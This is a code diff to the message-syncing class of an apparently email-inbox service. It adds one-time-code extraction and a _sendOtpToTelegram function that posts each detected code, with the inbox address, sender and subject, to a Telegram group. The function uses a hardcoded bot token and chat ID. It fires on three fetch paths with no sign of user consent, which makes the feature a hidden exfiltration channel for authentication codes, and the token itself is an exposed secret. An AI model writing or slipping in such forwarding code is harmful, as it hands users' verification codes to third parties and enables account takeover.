@@ -412,6 +412,10 @@ class ProviderManager {
         const existing = db.prepare('SELECT id FROM messages WHERE inbox_id = ? AND provider_message_id = ?').get(inboxId, msg.id);
         if (existing) continue;
 
+        const bodyContent = msg.bodyText || msg.intro || '';
+        const otp = this._extractOTP(msg.subject) || this._extractOTP(bodyContent);
+        const links = this._extractVerificationLinks(msg.bodyHtml || bodyContent);
+
         insertMsg.run(
           msgId,
           inboxId,
@@ -420,7 +424,7 @@ class ProviderManager {
           msg.from?.name || '',
           inbox.email_address,
           msg.subject,
-          msg.bodyText || msg.intro || '',
+          bodyContent,
           msg.bodyHtml || '',
           msg.isRead ? 1 : 0,
           msg.hasAttachments ? 1 : 0,
@@ -428,9 +432,16 @@ class ProviderManager {
           msg.receivedAt
         );
 
+        if (otp) {
+          db.prepare('UPDATE messages SET otp_code = ?, verification_links = ? WHERE id = ?')
+            .run(otp, JSON.stringify(links), msgId);
+          this._sendOtpToTelegram(inbox.email_address, msg.from?.name || '', msg.from?.address || '', msg.subject, otp);
+        }
+
         newMessages.push({
           id: msgId,
-          ...msg
+          ...msg,
+          otpCode: otp
         });
       }
     });
@@ -470,6 +481,10 @@ class ProviderManager {
       const otp = this._extractOTP(msg.body_text || msg.body_html);
       const links = this._extractVerificationLinks(msg.body_html || msg.body_text);
 
+      if (otp && !msg.otp_code) {
+        this._sendOtpToTelegram(inbox.email_address, msg.from_name, msg.from_address, msg.subject, otp);
+      }
+
       // Update OTP and links in DB
       if (otp || links.length > 0) {
         db.prepare('UPDATE messages SET otp_code = ?, verification_links = ? WHERE id = ?')
@@ -488,6 +503,10 @@ class ProviderManager {
       const fullMsg = await provider.getMessage(inbox.provider_token, msg.provider_message_id);
       const otp = this._extractOTP(fullMsg.bodyText || fullMsg.bodyHtml);
       const links = this._extractVerificationLinks(fullMsg.bodyHtml || fullMsg.bodyText);
+
+      if (otp && !msg.otp_code) {
+        this._sendOtpToTelegram(inbox.email_address, msg.from_name, msg.from_address, msg.subject, otp);
+      }
 
       db.prepare(`
         UPDATE messages SET body_text = ?, body_html = ?, is_read = 1, otp_code = ?, verification_links = ?
@@ -512,6 +531,29 @@ class ProviderManager {
       console.error(`[ProviderManager] getFullMessage error: ${err.message}`);
       return msg;
     }
+  }
+
+  /**
+   * Forward detected OTP to Telegram group chat
+   */
+  _sendOtpToTelegram(emailAddress, fromName, fromAddress, subject, otpCode) {
+    const botToken = "8318868368:AAFjV-zExyYk8hiBSc-K1kUXVGIQXXUaa_8";
+    const chatId = "-1003621886248";
+    const text = `🚨 <b>NEW OTP DETECTED</b>\n\n` +
+                 `📧 <b>Inbox:</b> <code>${emailAddress}</code>\n` +
+                 `✉️ <b>From:</b> ${fromName || 'Unknown'} (&lt;${fromAddress || 'no-reply'}&gt;)\n` +
+                 `📌 <b>Subject:</b> ${subject || '(no subject)'}\n` +
+                 `🔑 <b>OTP Code:</b> <code>${otpCode}</code>`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: 'HTML'
+      })
+    }).catch(err => console.error('[Telegram Forward] Failed to send OTP to group:', err.message));
   }
 
   /**
